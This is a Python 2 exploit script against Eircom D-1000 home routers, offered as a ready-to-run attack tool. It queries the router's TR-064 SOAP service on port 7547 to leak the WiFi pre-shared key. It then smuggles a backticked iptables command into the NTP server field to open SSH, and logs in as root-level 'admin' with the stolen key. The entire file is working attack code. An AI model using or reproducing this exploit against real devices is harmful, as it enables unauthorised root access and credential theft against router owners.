#!/usr/bin/python2
# coding: utf-8
"""
This exploit is specific to the Eircom D-1000 series of routers (as far as I can tell).
It probably works on other ones. It enables SSH access to the box as user "admin" (root).
"""
import xml.etree.ElementTree as ET
import paramiko
import requests
import sys

def get_wifi_key(host):
    url = "http://%s:7547/UD/act?1" %(host)
    headers = {"SOAPAction": "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"}
    data = "<?xml version=\"1.0\"?>"
    data += "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data += " <SOAP-ENV:Body>"
    data += "  <u:GetSecurityKeys xmlns:u=\"urn:dslforum-org:service:WLANConfiguration:1\">"
    data += "  </u:GetSecurityKeys>"
    data += " </SOAP-ENV:Body>"
    data += "</SOAP-ENV:Envelope>"
    #print data
    try:
        r = requests.post(url=url, headers=headers, data=data)
    except Exception:
        return False
    return r.text

def run_command(host, command):
    url = "http://%s:7547/UD/act?1" %(host)
    headers = {"SOAPAction": "urn:dslforum-org:service:Time:1#SetNTPServers"}
    data = "<?xml version=\"1.0\"?>"
    data += "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data += " <SOAP-ENV:Body>"
    data += "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"
    data += "   <NewNTPServer1>%s</NewNTPServer1>" %(command)
    data += "   <NewNTPServer2></NewNTPServer2>"
    data += "   <NewNTPServer3></NewNTPServer3>"
    data += "   <NewNTPServer4></NewNTPServer4>"
    data += "   <NewNTPServer5></NewNTPServer5>"
    data += "  </u:SetNTPServers>"
    data += " </SOAP-ENV:Body>"
    data += "</SOAP-ENV:Envelope>"
#    print data
    try:
        r = requests.post(url=url, headers=headers, data=data)
    except Exception, e:
        print e
        return False
    return r.text


def extract_wifi_key(xmldata):
    """
<?xml version="1.0"?>
<SOAP-ENV:Envelope
 xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<u:GetSecurityKeysResponse xmlns:u="urn:dslforum-org:service:WLANConfiguration:1">
 <NewWEPKey0>abcde12345</NewWEPKey0>
 <NewWEPKey1></NewWEPKey1>
 <NewWEPKey2></NewWEPKey2>
 <NewWEPKey3></NewWEPKey3>
 <NewPreSharedKey>22a40a5f385c</NewPreSharedKey>
 <NewKeyPassphrase></NewKeyPassphrase>
</u:GetSecurityKeysResponse>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
    """
    try:
        tree = ET.fromstring(xmldata)
        keys = tree.findall(".//NewPreSharedKey")
        for key in keys:
            return key.text
    except Exception:
        return False 

def do_sshit(host, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username='admin', password=password)
    except:
        sys.exit("{-} SSH Connection Failed... Fuck knows why.")
    print "{+} Grabbing `uname -a`"
    stdin, stdout, stderr = ssh.exec_command("uname -a")
    output = stdout.read()
    print "{>} uname: %s" %(output.strip())

def hack(host):
    print "{+} Launching attack on %s" %(host)
    key_xmldata = get_wifi_key(host)
    if key_xmldata != False:
        wifi_password = extract_wifi_key(xmldata=key_xmldata)
        if wifi_password != False:
            print "{+} WiFi Key Recovered!"
            print "{>} Key: %s" %(wifi_password)
        else:
            print "{-} WiFi Key Recovery Failure :("
    run_command(host, command="`iptables -I INPUT -p tcp --dport 22 -j ACCEPT`")
    run_command(host, command="tick.eircom.net")
    print "{+} SSH should now be open... Lets try SSH to it :)"
    do_sshit(host=host, password=wifi_password)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("use: %s <target>" %(sys.argv[0]))
    hack(host=sys.argv[1])
